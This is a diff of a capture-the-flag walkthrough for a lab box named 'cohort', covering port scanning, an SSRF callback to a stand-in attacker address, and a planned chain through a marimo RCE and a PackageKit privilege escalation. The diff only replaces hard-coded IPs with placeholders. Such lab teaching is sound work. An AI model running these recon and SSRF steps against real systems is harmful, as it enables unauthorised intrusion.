@@ -1,7 +1,7 @@
 # cohort — Hands-On Walkthrough (the *decision tree*, not the happy path)
 
 > **Box:** cohort · easy · Linux (Ubuntu 24.04, kernel 6.8.0-136)
-> **IP used here:** `10.129.244.174` (yours will differ on respawn — substitute it everywhere)
+> **IP used here:** `$TARGET` (yours will differ on respawn — substitute it everywhere)
 > **Final chain:** `SSRF → internal-vhost leak → marimo pre-auth RCE (CVE-2026-39987) → user → PackageKit TOCTOU LPE (CVE-2026-41651) → root`
 >
 > This document is deliberately written as *"at this point you have these options; I tried X, Y, Z; X and Y died for these reasons; Z was the way."* Follow it slowly — the dead-ends are the lesson. The clean/straight version lives in `REPORT.md`.
@@ -9,7 +9,7 @@
 > **How to read this doc:** after every command there is a **✅ Expected** block showing roughly what you should see. If your output *doesn't* match it, **stop and fix that before moving on** — don't push forward hoping it sorts itself out. Most mismatches trace back to the three recurring gotchas below.
 
 ### ⚠️ Three gotchas that cause 90% of "it's not working" (re-read when stuck)
-1. **Use YOUR current tun0 IP, never a copy-pasted one.** The box respawns and your VPN IP can change between sessions. Anywhere this doc says `10.10.15.6`, substitute what `ip -br a | grep tun` shows *right now*.
+1. **Use YOUR current tun0 IP, never a copy-pasted one.** The box respawns and your VPN IP can change between sessions. Anywhere this doc says `$ATTACKER_IP`, substitute what `ip -br a | grep tun` shows *right now*.
 2. **Start your listener BEFORE you fire the request that calls back to it.** An SSRF/reverse callback to a port with nothing listening just returns empty — that is NOT a "the vuln doesn't work," it's "nobody was home." (This is the #1 thing that looks like failure but isn't.)
 3. **Exactly ONE VPN tunnel.** If `ip -br a | grep tun` shows `tun0` *and* `tun1` both on your IP, return traffic is split and everything reads as flaky/empty. Kill all openvpn, bring up one. (See Phase 0.)
 
@@ -21,7 +21,7 @@ Before any recon, two environment traps worth internalizing:
 
 1. **HTB blocks ICMP.** A failing `ping` proves *nothing*. Always test reachability with a **TCP connect**, not ping:
    ```bash
-   for p in 22 80 443; do (echo > /dev/tcp/10.129.244.174/$p) 2>/dev/null && echo "$p open"; done
+   for p in 22 80 443; do (echo > /dev/tcp/$TARGET/$p) 2>/dev/null && echo "$p open"; done
    ```
    > **✅ Expected:**
    > ```
@@ -54,8 +54,8 @@ Before any recon, two environment traps worth internalizing:
 ```bash
 mkdir -p nmap web fuzz loot      # <- do this FIRST, or `-oN nmap/...` errors "No such file or directory"
 # full TCP sweep first, then service/script scan on what's open
-nmap -p- --min-rate 2000 -oN nmap/full-tcp.txt 10.129.244.174
-nmap -sC -sV -p 22,80,443 -oN nmap/services.txt 10.129.244.174
+nmap -p- --min-rate 2000 -oN nmap/full-tcp.txt $TARGET
+nmap -sC -sV -p 22,80,443 -oN nmap/services.txt $TARGET
 ```
 > **✅ Expected:** three open ports and nothing else —
 > ```
@@ -64,12 +64,12 @@ nmap -sC -sV -p 22,80,443 -oN nmap/services.txt 10.129.244.174
 > 443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
 > ```
 > plus, in the `-sC -sV` output, the 443 cert line `Subject: commonName=cohort.htb` with `Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb`.
-> ⚠️ Pass the ports as `-p 22,80,443` (with `-p`!). Writing them bare (`... services.txt 22,80,443 10.129.244.174`) makes nmap treat them as a hostname → `Failed to resolve "22,80,443"`.
+> ⚠️ Pass the ports as `-p 22,80,443` (with `-p`!). Writing them bare (`... services.txt 22,80,443 $TARGET`) makes nmap treat them as a hostname → `Failed to resolve "22,80,443"`.
 
 **Result:** only **22 (OpenSSH 9.6p1)**, **80 / 443 (nginx 1.24.0)**. 443 cert CN=`cohort.htb`, SAN `*.cohort.htb`.
 
 ```bash
-echo "10.129.244.174 cohort.htb" | sudo tee -a /etc/hosts
+echo "$TARGET cohort.htb" | sudo tee -a /etc/hosts
 ```
 > **✅ Expected:** the line echoes back, and `curl -sk https://cohort.htb/ | wc -c` now returns bytes (not a DNS error). If a browser says `ERR_NAME_NOT_RESOLVED`, that's the *in-app/preview* browser (it ignores `/etc/hosts`) — use a real Firefox/Chromium, or just use `curl` from the terminal.
 
@@ -150,19 +150,19 @@ An endpoint that takes an **attacker-supplied URL** and the server **fetches it*
 ```bash
 nc -lvnp 9000            # or: python3 -m http.server 9000
 ```
-**Step B — find your current tun0 IP (do NOT trust 10.10.15.6 blindly):**
+**Step B — find your current tun0 IP (do NOT trust $ATTACKER_IP blindly):**
 ```bash
-ip -br a | grep tun      # e.g. tun0  UNKNOWN  10.10.14.22/23  -> your IP is 10.10.14.22
+ip -br a | grep tun      # e.g. tun0  UNKNOWN  $ATTACKER_IP/23  -> your IP is $ATTACKER_IP
 ```
 **Step C — in Terminal 2, fire the SSRF at `http://<YOUR-tun0-IP>:9000/callback`:**
 ```bash
 curl -sk -X POST https://cohort.htb/api/v1/validate -H 'Content-Type: application/json' \
-     -d '{"url":"http://10.10.14.22:9000/callback"}'    # <-- replace with YOUR IP from Step B
+     -d '{"url":"http://$ATTACKER_IP:9000/callback"}'    # <-- replace with YOUR IP from Step B
 ```
 > **✅ Expected — TWO things happen at once:**
 > 1. **Terminal 1 (listener)** shows an inbound connection, e.g.
 >    ```
->    connect to [10.10.14.22] from (UNKNOWN) [10.129.244.174] ...
+>    connect to [$ATTACKER_IP] from (UNKNOWN) [$TARGET] ...
 >    GET /callback HTTP/1.1
 >    User-Agent: CohortInsights/1.0
 >    ```
@@ -202,7 +202,7 @@ upstream "notebooks" host = nb-1be3782a8afd3ad5.cohort.htb -> 127.0.0.1:8888
 
 ```bash
 # repoint hosts to the leaked vhost
-echo "10.129.244.174 cohort.htb nb-1be3782a8afd3ad5.cohort.htb" | sudo tee /etc/hosts
+echo "$TARGET cohort.htb nb-1be3782a8afd3ad5.cohort.htb" | sudo tee /etc/hosts
 curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version    # -> 0.20.4
 ```
 > **✅ Expected:** `/api/version` returns `0.20.4` (the vulnerable marimo). If it instead 301-redirects to `cohort.htb`, your `/etc/hosts` line for the `nb-<hash>` vhost is missing/misspelled — re-add it. Use the hostname you copied above, not the one printed here (yours may differ on respawn).
@@ -286,7 +286,7 @@ Two interesting system-management utilities with known CVEs:
 > **Placeholders used in every command below — substitute your own values:**
 > - `ws_exec.py` = the WS PTY driver script (shown below). Run these commands **from the folder where you saved it** (so `python3 ws_exec.py ...` resolves); they execute **on the target** via the marimo WebSocket.
 > - `<WORKDIR>` = whatever directory *you* work in on your Kali (your own `.../cohort/...`). The "your Kali" commands run from there.
-> - `<TUN_IP>` = your current VPN IP, from `ip -br a | grep tun` (do **not** copy `10.10.15.6`).
+> - `<TUN_IP>` = your current VPN IP, from `ip -br a | grep tun` (do **not** copy `$ATTACKER_IP`).
 >
 > Reminder: each `ws_exec.py` call is a **fresh shell** — `cd`/`&` don't persist, so chain with `;` and use absolute paths.
 
